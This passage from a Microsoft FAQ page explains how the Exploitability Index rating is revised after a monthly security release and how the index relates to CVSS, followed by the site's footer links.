  The ability to rate the possible exploitation of vulnerabilities is an evolving science, and new techniques for exploitation in general, or unique techniques specific to a vulnerability, or new trends in detected exploits of particular products may be discovered that could change the Exploitability Index rating. However, the goal of the Exploitability Index is to help customers prioritize those updates for the most current monthly release. Therefore, if there is information that would change an assessment released in the first month of a security release, Microsoft will update the Exploitability Index. If information becomes available in subsequent months, after most customers have made their prioritization decisions, the Exploitability Index will not be updated as it is no longer useful to the customer. When an Exploitability Index rating is corrected in a way that reflects increased risk to customers, the security update revision is incremented at a major version number (for instance, from 1.0 to 2.0). When risk is adjusted downwards, the update revision is incremented at a minor version number (for instance, from 1.0 to 1.1).
* ### How does the Exploitability Index relate to the Common Vulnerability Scoring System (CVSS) and other rating systems?

  The Exploitability Index is separate and not related to other rating systems. However, the MSRC is a contributing member to the Common Vulnerability Scoring System (CVSS), and Microsoft shares its experience and customer feedback in building and releasing the Exploitability Index with the working group in order to help ensure the CVSS is effective and actionable.

What's new

* [Surface Pro](https://www.microsoft.com/en-us/surface/devices/surface-pro-11th-edition)
* [Surface Laptop](https://www.microsoft.com/en-us/surface/devices/surface-laptop-7th-edition)
* [Surface Laptop Studio 2](https://www.microsoft.com/en-us/d/Surface-Laptop-Studio-2/8rqr54krf1dz)
* [Surface Laptop Go 3](https://www.microsoft.com/en-us/d/Surface-Laptop-Go-3/8p0wwgj6c6l2)
* [Microsoft Copilot](https://www.microsoft.com/en-us/microsoft-copilot)
* [AI in Windows](https://www.microsoft.com/en-us/windows/copilot-ai-features)
* [Explore Microsoft products](https://www.microsoft.com/en-us/microsoft-products-and-apps)
* [Windows 11 apps](https://www.microsoft.com/windows/windows-11-apps)

Microsoft Store

* [Account profile](https://account.microsoft.com/)
* [Download Center](https://www.microsoft.com/en-us/download)
* [Microsoft Store support](https://go.microsoft.com/fwlink/?linkid=2139749)
* [Returns](https://www.microsoft.com/en-us/store/b/returns)
* [Order tracking](https://www.microsoft.com/en-us/store/b/order-tracking)
* [Certified Refurbished](https://www.microsoft.com/en-us/store/b/certified-refurbished-products)
* [Microsoft Store Promise](https://www.microsoft.com/en-us/store/b/why-microsoft-store?icid=footer_why-msft-store_7102020)
* [Flexible Payments](https://www.microsoft.com/en-us/store/b/payment-financing-options?icid=footer_financing_vcc)

Education

* [Microsoft in education](https://www.microsoft.com/en-us/education)
* [Devices for education](https://www.microsoft.com/en-us/education/devices/overview)
* [Microsoft Teams for Education](https://www.microsoft.com/en-us/education/products/teams)
* [Microsoft 365 Education](https://www.microsoft.com/en-us/education/products/microsoft-365)
* [How to buy for your school](https://www.microsoft.com/education/how-to-buy)
* [Educator training and development](https://education.microsoft.com/)
* [Deals for students and parents](https://www.microsoft.com/en-us/store/b/education)
* [Azure for students](https://azure.microsoft.com/en-us/free/students/)

Business

* [Microsoft Cloud](https://www.microsoft.com/en-us/microsoft-cloud)
* [Microsoft Security](https://www.microsoft.com/en-us/security)
* [Dynamics 365](https://www.microsoft.com/en-us/dynamics-365)
* [Microsoft 365](https://www.microsoft.com/en-us/microsoft-365/business)
* [Microsoft Power Platform](https://www.microsoft.com/en-us/power-platform)
* [Microsoft Teams](https://www.microsoft.com/en-us/microsoft-teams/group-chat-software)
* [Microsoft 365 Copilot](https://www.microsoft.com/en-us/microsoft-365/copilot/copilot-for-work)
* [Small Business](https://www.microsoft.com/en-us/store/b/business?icid=CNavBusinessStore)

Developer & IT

* [Azure](https://azure.microsoft.com/en-us/)
* [Microsoft Developer](https://developer.microsoft.com/en-us/)
* [Documentation](https://learn.microsoft.com/docs/)
* [Microsoft Learn](https://learn.microsoft.com/)
* [Microsoft Tech Community](https://techcommunity.microsoft.com/)
* [Azure Marketplace](https://azuremarketplace.microsoft.com/en-us/)
* [AppSource](https://appsource.microsoft.com/en-us/)
* [Visual Studio](https://visualstudio.microsoft.com/)

Company

* [Careers](https://careers.microsoft.com/)
* [About Microsoft](https://www.microsoft.com/about)
* [Company news](https://news.microsoft.com/)
* [Privacy at Microsoft](https://privacy.microsoft.com/en-us)
* [Investors](https://www.microsoft.com/investor/default.aspx)
* [Diversity and inclusion](https://www.microsoft.com/en-us/diversity/)
* [Accessibility](https://www.microsoft.com/en-us/accessibility)
* [Sustainability](https://www.microsoft.com/en-us/sustainability/)

[English (United States)](https://www.microsoft.com/en-us/locale.aspx)
[Your Privacy Choices Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)
[Your Privacy Choices Opt-Out Icon

Your Privacy Choices](https://aka.ms/yourcaliforniaprivacychoices)

[Consumer Health Privacy](https://go.microsoft.com/fwlink/?linkid=2259814)

* [Sitemap](https://www.microsoft.com/en-us/sitemap1.aspx)
* [Contact Microsoft](https://support.microsoft.com/contactus)
* [Privacy](https://go.microsoft.com/fwlink/?LinkId=521839)
* Manage cookies
* [Terms of use](https://go.microsoft.com/fwlink/?LinkID=206977)
* [Trademarks](https://go.microsoft.com/fwlink/?linkid=2196228)
* [Safety & eco](https://go.microsoft.com/fwlink/?linkid=2196227)
* [Recycling](https://www.microsoft.com/en-us/legal/compliance/recycling)
* [About our ads](https://choice.microsoft.com)
* © Microsoft 2025


